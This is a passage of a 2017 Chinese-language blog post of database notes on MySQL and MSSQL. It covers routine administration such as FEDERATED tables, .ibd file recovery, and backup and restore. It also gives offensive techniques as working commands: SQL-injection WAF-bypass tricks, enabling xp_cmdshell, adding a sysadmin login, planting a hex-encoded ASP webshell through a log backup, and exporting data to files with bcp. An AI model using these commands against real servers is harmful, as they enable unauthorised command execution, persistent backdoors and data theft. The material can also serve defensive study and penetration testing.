<li>创建远程表<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`T1`</span>(</div><div class="line"><span class="keyword">id</span> <span class="built_in">INT</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</div><div class="line"><span class="string">`name`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>),</div><div class="line">PRIMARY <span class="keyword">KEY</span> (<span class="keyword">id</span>)</div><div class="line">)</div><div class="line"><span class="keyword">ENGINE</span>=MYISAM;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>ST2</p>
<ol>
<li><p>在my.ini中开启federated存储引擎</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[mysqld]</div><div class="line">federated</div></pre></td></tr></table></figure>
</li>
<li><p>使用 CONNECTION 创建 FEDERATED 表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`T1_FEDERATED`</span>(</div><div class="line"><span class="keyword">id</span> <span class="built_in">INT</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</div><div class="line"><span class="string">`name`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>),</div><div class="line">PRIMARY <span class="keyword">KEY</span> (<span class="keyword">id</span>)</div><div class="line">)</div><div class="line"><span class="keyword">ENGINE</span>=FEDERATED</div><div class="line"><span class="keyword">CONNECTION</span>=<span class="string">'mysql://root:password@127.0.0.1:3306/test/T1'</span>;</div></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>Note<br>The remote server must be a MySQL server.<br>Care should be taken when creating a FEDERATED table since the index definition from an equivalent MyISAM or other table may not be supported.</p>
</blockquote>
<p>How to attack?<br>在开启引擎的情况下可以通过其他用户访问本地其他表</p>
<h3 id="Restoring-Orphan-File-Per-Table-ibd-Files"><a href="#Restoring-Orphan-File-Per-Table-ibd-Files" class="headerlink" title="Restoring Orphan File-Per-Table ibd Files"></a>Restoring Orphan File-Per-Table ibd Files</h3><p>在有.frm和.ibd文件的时候（独立表空间，innodb_file_per_table=1）恢复数据库，首先确保当前数据库和待恢复数据库版本一致！</p>
<p>ST1</p>
<ol>
<li>获取表结构<br>建立同名数据库<br>mysql&gt; CREATE DATABASE dbname;</li>
<li>将.frm文件拖入相应的数据库目录下</li>
<li>查看表结构<br>mysql&gt; SHOW CREATE TABLE tbname;</li>
</ol>
<blockquote>
<p>Note<br>恢复表结构方式2（推荐使用）<br>MySQL Utilities<br><a href="https://dev.mysql.com/downloads/utilities/" target="_blank" rel="external">https://dev.mysql.com/downloads/utilities/</a><br>$ mysqlfrm –basedir=/usr/local/bin/mysql test1:db1.frm –port=3333</p>
</blockquote>
<p>ST2</p>
<ol>
<li>使用导出的语句创建表结构</li>
<li>分离当前表空间<br>mysql&gt; ALTER TABLE dbname.tbname DISCARD TABLESPACE;</li>
<li>拷贝要恢复的.idb文件到新数据库目录下(在Linux下确保.ibd文件有合适的权限)</li>
<li>导入.ibd文件<br>mysql&gt; ALTER TABLE dbname.tbname IMPORT TABLESPACE; SHOW WARNINGS;  </li>
</ol>
<h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><p>WAF拦截流程<br>数据清洗 -&gt; 规则匹配</p>
<p>大小写转换 union -&gt; UnIon<br>删除型过滤 union -&gt; unioUNIONn<br>&lt;&gt; 等价于 BETWEEN<br>= 等价于 like<br>Hex() bin() 等价于ascii()<br>Sleep() 等价于 benchmark()<br>Mid()substring() 等价于 substr(）<br>@@user 等价于 User()<br>@@Version 等价于 version()<br>mysql支持 &amp;&amp;,||<br><code>+ 加号当空格</code><br><code>/*Comments*/ 注释当空格</code><br><code>CONCAT/*Comments*/(&#39;a&#39;,&#39;test&#39;);</code> //函数名与左括号之间可以存在特殊字符<br><code>where name = 8E0union select &#39;test&#39;</code> // 8.0union select ‘test’ 无法绕过正则匹配union\sselect<br><code>UNION/*!12345select all*/1,2</code>  //union all select 1,2<br>？<br>` 起到注释<br>union%250Cselect %250C空白符<br>union%25A0select<br>mysql 忽略未知的编码</p>
<blockquote>
<p>Note<br>通过日志查看mysql语句执行情况<br>配置my.ini开启日志<br>[mysqld]<br>log = mysql.log<br>或者<br>set global general_log=1;</p>
</blockquote>
<h3 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</div><div class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="keyword">test</span>;</div><div class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> <span class="keyword">test</span>()</div><div class="line"><span class="keyword">BEGIN</span></div><div class="line">	<span class="keyword">DECLARE</span> i <span class="built_in">INT</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>;</div><div class="line">	#SET i=1;</div><div class="line">	WHILE i &lt; 3608 DO</div><div class="line">		#CREATE TABLE ti(id int) ENGINE=InnoDB;</div><div class="line">		<span class="keyword">set</span> @sql_create_table = <span class="keyword">concat</span>(<span class="string">'CREATE TABLE IF NOT EXISTS tb_'</span>,i,<span class="string">'(id int) ENGINE=InnoDB'</span>);</div><div class="line">		<span class="keyword">PREPARE</span> sql_create_table <span class="keyword">FROM</span> @sql_create_table;</div><div class="line">		<span class="keyword">EXECUTE</span> sql_create_table;</div><div class="line">		<span class="keyword">SET</span> i=i+<span class="number">1</span>;</div><div class="line">	<span class="keyword">END</span> <span class="keyword">WHILE</span>;</div><div class="line"><span class="keyword">END</span>;</div><div class="line"></div><div class="line"><span class="keyword">CALL</span> <span class="keyword">test</span>()</div></pre></td></tr></table></figure>
<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><p>获取数据库文件路径</p>
<p><code>select database_id,name,physical_name AS CurrentLocation,state_desc,size from sys.master_files where database_id=db_id(N&#39;wx&#39;);</code> </p>
<p>添加角色</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> LOGIN ruo <span class="keyword">WITH</span> <span class="keyword">PASSWORD</span> = <span class="string">'123456'</span>;</div><div class="line">EXEC sp_addsrvrolemember 'ruo', 'sysadmin'</div></pre></td></tr></table></figure>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1 //允许修改高级参数</span></div><div class="line"><span class="string">EXEC sp_configure '</span>xp_cmdshell<span class="string">',1  //打开xp_cmdshell扩展</span></div><div class="line"><span class="string">EXEC master..dbo.xp_cmdshell '</span>whomai<span class="string">'</span></div></pre></td></tr></table></figure>
<h3 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">database</span> [databasename] <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span> //第一次对数据库进行一次全备份</div><div class="line"><span class="keyword">backup</span> <span class="keyword">database</span> [databasename] <span class="keyword">to</span> disk = <span class="string">'d:\1.asp'</span></div><div class="line"><span class="keyword">BACKUP</span> <span class="keyword">LOG</span> cannot be performed because there <span class="keyword">is</span> <span class="keyword">no</span> <span class="keyword">current</span> <span class="keyword">database</span> backup.</div></pre></td></tr></table></figure>
<h3 id="备份写SHELL"><a href="#备份写SHELL" class="headerlink" title="备份写SHELL"></a>备份写SHELL</h3><ol>
<li><p>建立cmd表，并写入值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a image)</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="number">0x3C256576616C20726571756573742822732229253E</span>)</div><div class="line"><span class="number">0x3C256576616C20726571756573742822732229253E</span> -&gt; &lt;%eval request(<span class="string">"s"</span>)%&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>进行增量备份</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">backup</span> <span class="keyword">log</span> databasename <span class="keyword">to</span> disk = <span class="string">'c:\1.asp'</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="备份还原"><a href="#备份还原" class="headerlink" title="备份还原"></a>备份还原</h3><p>ST1 建立同名数据库HealthSchoolMIS，也可以任意名字。<br>ST2 返回由备份集内包含的数据库和日志文件列表组成的结果集。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">RESTORE</span> FILELISTONLY</div><div class="line">   <span class="keyword">FROM</span> DISK = <span class="string">' D:\Hs.bak '</span></div><div class="line"><span class="string">``</span><span class="string">` </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">![](https://i.imgur.com/fK2iCEX.png)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">ST3 还原并指定数据库物理文件名称及路径。</span></div><div class="line"><span class="string">`</span><span class="string">``</span><span class="keyword">sql</span></div><div class="line"><span class="keyword">RESTORE</span> <span class="keyword">DATABASE</span> HealthSchoolMIS</div><div class="line">   <span class="keyword">FROM</span> DISK  = <span class="string">'D:\Hs.bak'</span></div><div class="line"><span class="keyword">WITH</span> <span class="keyword">REPLACE</span>,</div><div class="line"><span class="keyword">MOVE</span> <span class="string">'HealthSchoolMIS_Data'</span> <span class="keyword">TO</span> <span class="string">'D:\DATA\HealthSchoolMIS_Data.MDF'</span>,</div><div class="line"><span class="keyword">MOVE</span> <span class="string">'HealthSchoolMIS_Log'</span> <span class="keyword">TO</span> <span class="string">'D:\DATA\HealthSchoolMIS_Log.LDF'</span>,</div><div class="line"><span class="keyword">MOVE</span> <span class="string">'HealthSchoolMIS_1_Log'</span> <span class="keyword">TO</span> <span class="string">'D:\DATA\hsmis_user_log'</span></div></pre></td></tr></table></figure></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>将数据插入本地表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> temp (<span class="keyword">data</span> <span class="built_in">text</span>)</div><div class="line"><span class="keyword">bulk</span> <span class="keyword">insert</span> temp <span class="keyword">from</span> <span class="string">'d:\test.txt'</span> <span class="keyword">with</span> (codepage=<span class="string">'RAW'</span>)</div></pre></td></tr></table></figure></p>
<p>bcp {dbtable | query} {in | out | queryout | format} 数据文件<br>数据库名dbtable -&gt; in/out<br>查询query -&gt; queryout</p>
<p>远程连接攻击数据库导出为文件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC master..xp_cmdshell 'bcp "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> test.dbo.temp<span class="string">" queryout d:\tset1.txt -c -S"</span>服务器地址<span class="string">" -U"</span>username<span class="string">" -P"</span><span class="keyword">password</span><span class="string">"'</span></div></pre></td></tr></table></figure></p>
<p>在数据库中<br>导出test数据库中temp表内容到文件(二进制文件也行)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EXEC master..xp_cmdshell 'bcp test.dbo.temp out d:\tset1.txt -c -T' </div><div class="line">EXEC master..xp_cmdshell 'bcp "<span class="keyword">select</span> * <span class="keyword">from</span> test.dbo.temp<span class="string">" queryout "</span>d:\test.exe<span class="string">" -c -T'</span></div></pre></td></tr></table></figure></p>
<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2></div></article></div></main><footer><div class="paginator"><a class="prev" href="/2017/12/14/名称欺骗中间人攻击/">prev</a><a class="next" href="/2017/11/01/SPNs/">next</a></div><div class="copyright"><p>&copy; 2017 <a href="http://ruos.org">ruo</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>